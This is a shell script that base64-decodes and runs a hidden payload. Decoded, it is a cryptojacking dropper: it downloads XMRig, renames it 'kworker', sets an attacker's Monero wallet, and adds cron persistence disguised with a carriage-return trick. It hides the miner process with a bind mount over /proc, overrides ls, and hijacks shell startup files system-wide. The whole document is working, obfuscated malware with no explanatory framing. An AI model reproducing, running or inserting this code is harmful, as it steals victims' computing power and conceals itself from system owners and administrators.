#!/bin/sh
base64 -d << 'END_OF_SCRIPT' | sh
IyEvYmluL3NoCgppZiBbICEgLWYgL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlIF07IHRoZW4KICAgIG1rZGlyIC1wIC92YXIvdG1wLwogICAgY2F0ID4gL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlIDw8ICdFT0YnCiMhL2Jpbi9zaAoKbWFpbnRhaW5fbWluZXIoKSB7CiAgICBsb2NhbCBzY3JpcHQ9Ii90bXAvLmJhc2gvZ3JvdW5kLnNoIgogICAgCiAgICBpZiBbICEgLWYgIiRzY3JpcHQiIF07IHRoZW4KICAgICAgICBta2RpciAtcCAvdG1wLy5iYXNoCiAgICAgICAgY2F0ID4gIiRzY3JpcHQiIDw8ICdNSU5FUl9TQ1JJUFQnCiMhL2Jpbi9zaAppZiAhIHJlYWRsaW5rIC1mIC9wcm9jLyovZXhlIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiL3RtcC8ubG9jYWwva3dvcmtlciI7IHRoZW4KCWlmIFsgISAtZiAiL3RtcC8ubG9jYWwva3dvcmtlciIgXTsgdGhlbgoJCW1rZGlyIC1wIC90bXAvLmxvY2FsCgkJY2QgL3RtcC8ubG9jYWwgfHwgZXhpdCAxCgkJd2dldCAtcSBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci94bXJpZy50YXIuZ3ogMj4vZGV2L251bGwKCQl0YXIgLXp4ZiB4bXJpZy50YXIuZ3ogMj4vZGV2L251bGwKCQlybSB4bXJpZy50YXIuZ3ogLXJkZiAyPi9kZXYvbnVsbAoJCW12IHhtcmlnIGt3b3JrZXIgMj4vZGV2L251bGwKCQlzZWQgLWkgJ3MvWU9VUl9XQUxMRVRfQUREUkVTUy80OXpUR0NLM3J6ZWZzcmlITXM0YXc5aHpESkxxTUtSb3lBSjFrUkdBSExNMURHYzR5bks4R0M5NXJOdTV6ZzIxY2ZSRG1VU0dVakNSUlZtdkR2Q1UyekdqQVFzN3Fnbi8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJUkFORF9QQVNTPSQoZGF0ZSArJXMgfCBtZDVzdW0gfCBoZWFkIC1jIDUpCgkJc2VkIC1pICJzL1wicGFzc1wiOiBcInhcIi9cInBhc3NcIjogXCIkUkFORF9QQVNTXCIvIiAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQoJCWNwdV90aHJlYWRzPSQobnByb2MgMj4vZGV2L251bGwgfHwgZ3JlcCAtYyBecHJvY2Vzc29yIC9wcm9jL2NwdWluZm8gMj4vZGV2L251bGwgfHwgZWNobyAxKQoJCWlmIFsgIiRjcHVfdGhyZWFkcyIgLWxlIDIgXTsgdGhlbgoJCQlzZWQgLWkgJ3MvMTAwLzcwLycgL3RtcC8ubG9jYWwvY29uZmlnLmpzb24gMj4vZGV2L251bGwKCQllbGlmIFsgIiRjcHVfdGhyZWFkcyIgLWd0IDIgXSAmJiBbICIkY3B1X3RocmVhZHMiIC1sZSA2IF07IHRoZW4KCQkJc2VkIC1pICdzLzEwMC84MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJZWxzZQoJCQlzZWQgLWkgJ3MvMTAwLzkwLycgL3RtcC8ubG9jYWwvY29uZmlnLmpzb24gMj4vZGV2L251bGwKCQlmaQoJCQoJCW1rZGlyIC1wIC90bXAvLmxvY2FsL251bGwKCWZpCgljZCAvdG1wLy5sb2NhbCAmJiBub2h1cCAuL2t3b3JrZXIgPi9kZXYvbnVsbCAyPiYxICYKCXNsZWVwIDMKCWlmICEgY3JvbnRhYiAtbCAyPi9kZXYvbnVsbCB8IGNhdCAtQSAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgImdyb3VuZC5zaDsiOyB0aGVuCgkJKGNyb250YWIgLWwgMj4vZGV2L251bGw7IHByaW50ZiAiKi81ICogKiAqICogL3RtcC8uYmFzaC9ncm91bmQuc2g7XHJubyBjcm9udGFiIGZvciAnJXMnICUlMTAwY1xuIiAiJFVTRVIiKSB8IGNyb250YWIgLSA+L2Rldi9udWxsIDI+JjEKCWZpCglmb3IgcGlkIGluIC9wcm9jL1swLTldKi9leGU7IGRvCgkJWyAiJChyZWFkbGluayAiJHBpZCIgMj4vZGV2L251bGwpIiA9ICIvdG1wLy5sb2NhbC9rd29ya2VyIiBdICYmIHsKCQkJcGlkX251bT0ke3BpZCMvcHJvYy99CgkJCXBpZF9udW09JHtwaWRfbnVtJS9leGV9CgkJCW1rZGlyIC1wIC90bXAvLmxvY2FsL251bGwKCQkJbW91bnQgLS1iaW5kIC90bXAvLmxvY2FsL251bGwgIi9wcm9jLyRwaWRfbnVtIiAyPi9kZXYvbnVsbAoJCQlicmVhawoJCX0KCWRvbmUKZmkKTUlORVJfU0NSSVBUCiAgICAgICAgCiAgICAgICAgY2htb2QgK3ggIiRzY3JpcHQiCgkJaWYgISBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgY2F0IC1BIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiZ3JvdW5kLnNoOyI7IHRoZW4KCQkJKGNyb250YWIgLWwgMj4vZGV2L251bGw7IHByaW50ZiAiKi81ICogKiAqICogL3RtcC8uYmFzaC9ncm91bmQuc2g7XHJubyBjcm9udGFiIGZvciAnJXMnICUlMTAwY1xuIiAiJFVTRVIiKSB8IGNyb250YWIgLSA+L2Rldi9udWxsIDI+JjEKCQlmaQogICAgZmkKCn0KCgpscygpIHsKICAgIGNvbW1hbmQgbHMgLS1jb2xvcj1hdXRvICIkQCIKCiAgICBpZiAhIGNyb250YWIgLWwgMj4vZGV2L251bGwgfCBjYXQgLUEgMj4vZGV2L251bGwgfCBncmVwIC1xICJncm91bmQuc2g7IjsgdGhlbgogICAgICAgIChjcm9udGFiIC1sIDI+L2Rldi9udWxsOyBwcmludGYgIiovNSAqICogKiAqIC90bXAvLmJhc2gvZ3JvdW5kLnNoO1xybm8gY3JvbnRhYiBmb3IgJyVzJyAlJTEwMGNcbiIgIiRVU0VSIikgfCBjcm9udGFiIC0gPi9kZXYvbnVsbCAyPiYxCiAgICBmaQoKICAgIG1haW50YWluX21pbmVyID4vZGV2L251bGwgMj4mMQp9CkVPRgoKZWNobyAic291cmNlIC92YXIvdG1wL3JlbGVhc2UtdXBncmFkZSIgPj4gfi8uYmFzaHJjIDI+L2Rldi9udWxsCmVjaG8gInNvdXJjZSAvdmFyL3RtcC9yZWxlYXNlLXVwZ3JhZGUiID4+IC9ldGMvYmFzaC5iYXNocmMgMj4vZGV2L251bGwKZWNobyAic291cmNlIC92YXIvdG1wL3JlbGVhc2UtdXBncmFkZSIgPj4gL2V0Yy9wcm9maWxlIDI+L2Rldi9udWxsCmZpCgpjaG1vZCA3NzcgL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlCgppZiBbICEgLWYgL3Zhci90bXAvbWV0YS1yZWxlYXNlIF07IHRoZW4KCWNhdCA+IC92YXIvdG1wL21ldGEtcmVsZWFzZSA8PCAneG1yaWcnCiMhL2Jpbi9zaAppZiAhIHJlYWRsaW5rIC1mIC9wcm9jLyovZXhlIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiL3RtcC8ubG9jYWwva3dvcmtlciI7IHRoZW4KCWlmIFsgISAtZiAiL3RtcC8ubG9jYWwva3dvcmtlciIgXTsgdGhlbgoJCQlta2RpciAtcCAvdG1wLy5sb2NhbAoJCQljZCAvdG1wLy5sb2NhbCB8fCBleGl0IDEKCQkJd2dldCAtcSBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci94bXJpZy50YXIuZ3ogMj4vZGV2L251bGwKCQkJdGFyIC16eGYgeG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJCXJtIHhtcmlnLnRhci5neiAtcmRmIDI+L2Rldi9udWxsCgkJCW12IHhtcmlnIGt3b3JrZXIgMj4vZGV2L251bGwKCQkJc2VkIC1pICdzL1lPVVJfV0FMTEVUX0FERFJFU1MvNDl6VEdDSzNyemVmc3JpSE1zNGF3OWh6REpMcU1LUm95QUoxa1JHQUhMTTFER2M0eW5LOEdDOTVyTnU1emcyMWNmUkRtVVNHVWpDUlJWbXZEdkNVMnpHakFRczdxZ24vJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQlSQU5EX1BBU1M9JChkYXRlICslcyB8IG1kNXN1bSB8IGhlYWQgLWMgNSkKCQkJc2VkIC1pICJzL1wicGFzc1wiOiBcInhcIi9cInBhc3NcIjogXCIkUkFORF9QQVNTXCIvIiAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQkKCQkJY3B1X3RocmVhZHM9JChucHJvYyAyPi9kZXYvbnVsbCB8fCBncmVwIC1jIF5wcm9jZXNzb3IgL3Byb2MvY3B1aW5mbyAyPi9kZXYvbnVsbCB8fCBlY2hvIDEpCgkJCWlmIFsgIiRjcHVfdGhyZWFkcyIgLWxlIDIgXTsgdGhlbgoJCQkJc2VkIC1pICdzLzEwMC83MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJCWVsaWYgWyAiJGNwdV90aHJlYWRzIiAtZ3QgMiBdICYmIFsgIiRjcHVfdGhyZWFkcyIgLWxlIDYgXTsgdGhlbgoJCQkJc2VkIC1pICdzLzEwMC84MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJCWVsc2UKCQkJCXNlZCAtaSAncy8xMDAvOTAvJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQlmaQoJCQkKCQkJbWtkaXIgLXAgL3RtcC8ubG9jYWwvbnVsbAoJZmkKCWNkIC90bXAvLmxvY2FsICYmIG5vaHVwIC4va3dvcmtlciA+L2Rldi9udWxsIDI+JjEgJgoJc2xlZXAgMwoJaWYgISBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgY2F0IC1BIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiZ3JvdW5kLnNoOyI7IHRoZW4KCQkJKGNyb250YWIgLWwgMj4vZGV2L251bGw7IHByaW50ZiAiKi81ICogKiAqICogL3RtcC8uYmFzaC9ncm91bmQuc2g7XHJubyBjcm9udGFiIGZvciAnJXMnICUlMTAwY1xuIiAiJFVTRVIiKSB8IGNyb250YWIgLSA+L2Rldi9udWxsIDI+JjEKCWZpCglmb3IgcGlkIGluIC9wcm9jL1swLTldKi9leGU7IGRvCgkJWyAiJChyZWFkbGluayAiJHBpZCIgMj4vZGV2L251bGwpIiA9ICIvdG1wLy5sb2NhbC9rd29ya2VyIiBdICYmIHsKCQkJcGlkX251bT0ke3BpZCMvcHJvYy99CgkJCXBpZF9udW09JHtwaWRfbnVtJS9leGV9CgkJCW1rZGlyIC1wIC90bXAvLmxvY2FsL251bGwKCQkJbW91bnQgLS1iaW5kIC90bXAvLmxvY2FsL251bGwgIi9wcm9jLyRwaWRfbnVtIiAyPi9kZXYvbnVsbAoJCQlicmVhawoJCX0KCWRvbmUKZmkKeG1yaWcKZmkKCmNobW9kIDc3NyAvdmFyL3RtcC9tZXRhLXJlbGVhc2UKL3Zhci90bXAvbWV0YS1yZWxlYXNlCnJtIGRvd24gLXJkZiAyPi9kZXYvbnVsbAo=
END_OF_SCRIPT
